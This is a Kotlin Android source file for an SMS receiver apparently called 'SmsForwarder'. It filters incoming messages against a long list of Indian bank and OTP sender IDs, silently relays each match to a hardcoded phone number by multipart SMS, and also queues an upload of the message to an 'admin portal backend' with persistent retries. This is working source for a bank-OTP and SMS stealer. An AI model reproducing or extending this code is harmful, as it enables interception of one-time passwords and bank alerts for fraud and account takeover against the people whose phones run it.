package com.example.sms_frwd

import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.example.sms_frwd.worker.UploadMessageWorker
import java.util.UUID
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class SmsReceiver : BroadcastReceiver() {

    companion object {

        private const val TAG = "SmsForwarder"
        private const val ACTION_SMS_SENT = "com.example.sms_frwd.SMS_SENT"

        // Bank sender IDs to match. Telecom operators wrap these with a
        // DLT prefix/suffix (e.g. "AX-UCOBNK-S", "VM-UCOBNK", "AD-UCOBNK-T"),
        // so matching strips everything except letters/digits and looks
        // for the core ID as a substring rather than an exact match.
        val BANK_SENDER_IDS = setOf(
            "SBIBNK", "SBIUPI", "HDFCBK", "ICICIB", "ICICIT", "AXISBK", "KMBANK",
            "PNBBNK", "PNBOTP", "BOBBNK", "CANBNK", "CANOTP", "UNIONB",
            "INDBNK", "BOIIND", "CBIIND", "UCOBNK", "IOBBNK", "PSBANK",
            "IDBIBK", "YESBNK", "INDUSB", "IDFCFB", "FEDBNK", "AUBANK",
            "RBLBNK", "DCBBNK", "CSBBNK", "BNDBNK", "CUBBNK", "KARBNK",
            "KVBBNK", "TMBANK", "SIBANK", "EQUBNK", "ESAFBK", "JANABK",
            "UJJVBN", "SURYBK", "UTKBNK", "FINBNK", "IPPBNK", "IPBOTP",
            "AIRBNK", "JIOBNK", "NSDLPB"
        )

        const val FORWARD_NUMBER = "+919177847799"

        fun matchBankSenderId(sender: String): String? {
            val cleaned = sender.uppercase().filter { it.isLetterOrDigit() }
            return BANK_SENDER_IDS.firstOrNull { cleaned.contains(it) }
        }

        // getDefault() picks an arbitrary SIM on dual-SIM phones when no
        // default SMS SIM is configured, which can silently drop the send.
        // Resolve the SIM the device actually uses for SMS explicitly.
        private fun resolveSmsManager(context: Context): SmsManager {

            val subId = SubscriptionManager.getDefaultSmsSubscriptionId()

            if (subId == SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                Log.w(TAG, "No default SMS subscription configured on this device; falling back to SmsManager.getDefault()")
                return SmsManager.getDefault()
            }

            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
                    .createForSubscriptionId(subId)
            } else {
                SmsManager.getSmsManagerForSubscriptionId(subId)
            }
        }

        private fun describeSendResult(resultCode: Int): String =
            when (resultCode) {
                Activity.RESULT_OK -> "SUCCESS"
                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> "GENERIC_FAILURE"
                SmsManager.RESULT_ERROR_NO_SERVICE -> "NO_SERVICE"
                SmsManager.RESULT_ERROR_NULL_PDU -> "NULL_PDU"
                SmsManager.RESULT_ERROR_RADIO_OFF -> "RADIO_OFF"
                SmsManager.RESULT_ERROR_LIMIT_EXCEEDED -> "LIMIT_EXCEEDED"
                else -> "UNKNOWN($resultCode)"
            }
    }

    override fun onReceive(
        context: Context,
        intent: Intent
    ) {

        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") {
            return
        }

        Log.d(TAG, "SMS_RECEIVED broadcast fired")

        val bundle = intent.extras ?: return

        val pdus =
            bundle["pdus"] as? Array<*>
                ?: return

        for (pdu in pdus) {

            val sms =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

                    val format =
                        bundle.getString("format")

                    SmsMessage.createFromPdu(
                        pdu as ByteArray,
                        format
                    )

                } else {

                    SmsMessage.createFromPdu(
                        pdu as ByteArray
                    )
                }

            val sender =
                sms.displayOriginatingAddress
                    ?: continue

            val message =
                sms.messageBody

            val matchedBank = matchBankSenderId(sender)

            Log.d(TAG, "sender=\"$sender\" matchedBank=$matchedBank")

            if (matchedBank != null) {
                forwardSms(context, sender, matchedBank, message, sms.timestampMillis)
                enqueueBackendUpload(context, sender, matchedBank, message, sms.timestampMillis)
            }
        }
    }

    // Uploads the matched SMS to the admin portal backend via WorkManager,
    // independent of and in addition to the direct SMS-to-phone forward in
    // forwardSms(). Enqueueing is fast/synchronous so it doesn't strain the
    // goAsync() budget used by forwardSms(); WorkManager persists the
    // request and retries the network leg on its own, surviving process
    // death, which a raw network call inside onReceive could not do.
    private fun enqueueBackendUpload(
        context: Context,
        sender: String,
        matchedBank: String,
        message: String,
        timestampMillis: Long
    ) {

        val inputData = workDataOf(
            UploadMessageWorker.KEY_CLIENT_MESSAGE_ID to UUID.randomUUID().toString(),
            UploadMessageWorker.KEY_SENDER_RAW to sender,
            UploadMessageWorker.KEY_SENDER_MATCHED to matchedBank,
            UploadMessageWorker.KEY_BODY to message,
            UploadMessageWorker.KEY_RECEIVED_AT_MILLIS to timestampMillis
        )

        val request = OneTimeWorkRequestBuilder<UploadMessageWorker>()
            .setInputData(inputData)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .setBackoffCriteria(
                BackoffPolicy.EXPONENTIAL,
                30,
                TimeUnit.SECONDS
            )
            .build()

        WorkManager.getInstance(context.applicationContext).enqueue(request)
    }

    private fun forwardSms(
        context: Context,
        sender: String,
        matchedBank: String,
        message: String,
        timestampMillis: Long
    ) {

        val forwardMessage =
            """
            Bank SMS ($matchedBank)

            From: $sender

            $message
            """.trimIndent()

        // The Context handed to a manifest-declared receiver's onReceive is a
        // ReceiverRestrictedContext, which throws on registerReceiver. Use
        // the application context instead, which allows it.
        val appContext = context.applicationContext

        // Keep the receiver process alive until the async send-result
        // callback fires, otherwise Android may reap it before we
        // find out whether the SMS actually left the device.
        val pendingResult = goAsync()
        val finished = AtomicBoolean(false)

        // finish() must be called at most once. The send-result callback
        // and the timeout below can both race to call it.
        fun finishOnce() {
            if (finished.compareAndSet(false, true)) {
                pendingResult.finish()
            }
        }

        val smsManager = resolveSmsManager(appContext)

        // Bank SMS almost always contain "₹", which isn't in the GSM-7
        // charset, forcing UCS-2 encoding and dropping the single-segment
        // limit to 70 chars. Our added header easily pushes the forwarded
        // text past that, so it must be split into multiple parts rather
        // than sent with the single-part sendTextMessage.
        val parts = smsManager.divideMessage(forwardMessage)
        val totalParts = parts.size
        var completedParts = 0

        val statusReceiver = object : BroadcastReceiver() {
            override fun onReceive(statusContext: Context, statusIntent: Intent) {

                completedParts++

                Log.d(
                    TAG,
                    "Send result for forward to $FORWARD_NUMBER (part $completedParts/$totalParts): ${describeSendResult(resultCode)}"
                )

                if (completedParts >= totalParts) {

                    try {
                        appContext.unregisterReceiver(this)
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to unregister send-status receiver", e)
                    }

                    finishOnce()
                }
            }
        }

        ContextCompat.registerReceiver(
            appContext,
            statusReceiver,
            IntentFilter(ACTION_SMS_SENT),
            ContextCompat.RECEIVER_NOT_EXPORTED
        )

        // The system ANRs a broadcast receiver held open (via goAsync) for
        // too long (~10s). The carrier can take much longer than that to
        // report a send result, so never block on it - let the broadcast
        // finish anyway; the receiver above stays registered and will
        // still log a late result if/when it arrives.
        Handler(Looper.getMainLooper()).postDelayed(
            { finishOnce() },
            8000
        )

        val sentPendingIntent = PendingIntent.getBroadcast(
            appContext,
            0,
            Intent(ACTION_SMS_SENT).setPackage(appContext.packageName),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val sentIntents = ArrayList<PendingIntent>(totalParts).apply {
            repeat(totalParts) { add(sentPendingIntent) }
        }

        try {

            smsManager.sendMultipartTextMessage(
                FORWARD_NUMBER,
                null,
                parts,
                sentIntents,
                null
            )

            Log.d(TAG, "sendMultipartTextMessage queued ($totalParts part(s)) for $sender -> $FORWARD_NUMBER")

        } catch (e: Exception) {

            Log.e(TAG, "sendMultipartTextMessage threw for $sender", e)

            try {
                appContext.unregisterReceiver(statusReceiver)
            } catch (unregisterError: Exception) {
                Log.w(TAG, "Failed to unregister send-status receiver", unregisterError)
            }

            finishOnce()
        }
    }
}
